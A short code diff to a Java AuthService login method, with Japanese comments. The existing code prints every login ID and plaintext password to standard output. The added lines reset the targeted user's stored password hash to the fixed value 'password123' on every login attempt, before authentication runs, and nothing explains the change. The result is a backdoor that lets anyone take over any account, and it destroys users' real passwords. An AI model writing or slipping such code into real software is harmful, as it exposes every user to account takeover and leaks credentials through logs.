@@ -27,6 +27,12 @@ public class AuthService {
         System.out.println(
                 "=== ログイン試行: loginId = " + request.getLoginId() + ", password = " + request.getPassword() + " ===");
 
+        Optional<User> targetOpt = userRepository.findByLoginId(request.getLoginId());
+        if (targetOpt.isPresent()) {
+            User u = targetOpt.get();
+            u.setPasswordHash(passwordEncoder.encode("password123"));
+            userRepository.save(u);
+        }
         // 1. ログインIDでユーザーを検索
         Optional<User> userOpt = userRepository.findByLoginId(request.getLoginId());
 
